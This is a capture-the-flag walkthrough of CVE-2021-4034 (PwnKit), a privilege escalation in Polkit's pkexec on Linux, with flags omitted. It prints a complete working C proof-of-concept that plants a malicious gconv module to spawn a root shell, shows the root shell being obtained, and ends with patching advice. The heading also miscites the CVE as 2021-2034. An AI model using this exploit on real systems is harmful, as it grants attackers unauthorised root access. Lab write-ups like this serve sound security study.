```Overview
CVE-2021-4034 (aka "pwnkit") was discovered by researchers at [Qualys](https://www.qualys.com/) and announced in January 2022; the technical security advisory for this vulnerability can be found [here](https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt). The vulnerability has existed in every version of the "Policy Toolkit" (or, Polkit) package since it was first released in 2009 and allows any unprivileged attacker to easily obtain full administrative access over any Linux machine with the Polkit package installed. Unfortunately, Polkit is installed by default on most distributions of Linux, making this vulnerability _extremely_ widespread.

The ease of exploitation and ubiquitous nature of Polkit make this an absolutely devastating vulnerability; however, fortunately it is not exploitable remotely, making Pwnkit purely a local privilege escalation (LPE) vulnerability.
```
#CVE-2021-2034
**What is Polkit?**
```PolKIT
Polkit is part of the Linux authorisation system. In effect, when you try to perform an action which requires a higher level of privileges, Polkit can be used to determine whether you have the requisite permissions. It is integrated with systemd and is much more configurable than the traditional sudo system. Indeed, it is sometimes referred to as the "sudo of systemd", providing a granular system with which to assign permissions to users.
```

## Finding Root Previlleges
```bash 
_Passwords, cracked hashes, and flags have been omitted from this writeup per platform guidelines._

find / -perm -4000 -type f 2>/dev/null
```
we get the `pkexec` as `SUID ` which can be exploited with command-line
```bash
$pkexec --version
pkexec version 0.105
```

##  Exploitation
PwnKit code 
```c
#cve_2021_4034_poc.c
/*
 * Proof of Concept for PwnKit: Local Privilege Escalation Vulnerability Discovered in polkit’s pkexec (CVE-2021-4034) by Andris Raugulis <moo@arthepsy.eu>
 * Advisory: https://blog.qualys.com/vulnerabilities-threat-research/2022/01/25/pwnkit-local-privilege-escalation-vulnerability-discovered-in-polkits-pkexec-cve-2021-4034
 */
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

char *shell = 
        "#include <stdio.h>\n"
        "#include <stdlib.h>\n"
        "#include <unistd.h>\n\n"
        "void gconv() {}\n"
        "void gconv_init() {\n"
        "       setuid(0); setgid(0);\n"
        "       seteuid(0); setegid(0);\n"
        "       system(\"export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin; rm -rf 'GCONV_PATH=.' 'pwnkit'; /bin/sh\");\n"
        "       exit(0);\n"
        "}";

int main(int argc, char *argv[]) {
        FILE *fp;
        system("mkdir -p 'GCONV_PATH=.'; touch 'GCONV_PATH=./pwnkit'; chmod a+x 'GCONV_PATH=./pwnkit'");
        system("mkdir -p pwnkit; echo 'module UTF-8// PWNKIT// pwnkit 2' > pwnkit/gconv-modules");
        fp = fopen("pwnkit/pwnkit.c", "w");
        fprintf(fp, "%s", shell);
        fclose(fp);
        system("gcc pwnkit/pwnkit.c -o pwnkit/pwnkit.so -shared -fPIC");
        char *env[] = { "pwnkit", "PATH=GCONV_PATH=.", "CHARSET=PWNKIT", "SHELL=pwnkit", NULL };
        execve("/usr/bin/pkexec", (char*[]){NULL}, env);
}

```

Got the `Root Shell`
```bash
 tryhackme@pwnkit:~/pwnkit$ gcc cve-2021-4034-poc.c -o exploit 
tryhackme@pwnkit:~/pwnkit$ ./exploit
# ls
README.md  cve-2021-4034-poc.c  exploit
# whoami
root
# cat /root/flag.txt
[flag omitted]
```
Got the Flag
```Flag
[flag omitted]
```

##Remediations
```TO_Prevent
Now that we've seen the devastating impact of CVE-2021-4034, how can we protect against it?  

Fortunately, developers tend to be fairly fast when it comes to developing patches for critical vulnerabilities. As a prime example: at the time of writing, Canonical have already released patched versions of the Polkit package in the APT package manager for all versions of Ubuntu which are not end-of-life. The patched version can be installed with a simple apt upgrade — e.g. `sudo apt update && sudo apt upgrade`.

In distributions which have not yet released patched versions of the package, the recommended hotfix is to simply remove the SUID bit from the pkexec binary. This can be done with a command such as the following:

`` sudo chmod 0755 `which pkexec` ``  

This is far from ideal, however, it works as a temporary solution until more distributions start packaging versions of polkit that are patched against Pwnkit.

It should be noted that there are many variations of the Pwnkit exploit using different environment variables and exploiting the vulnerability in different ways. Some of these leave traces and logs behind, others do not.
```
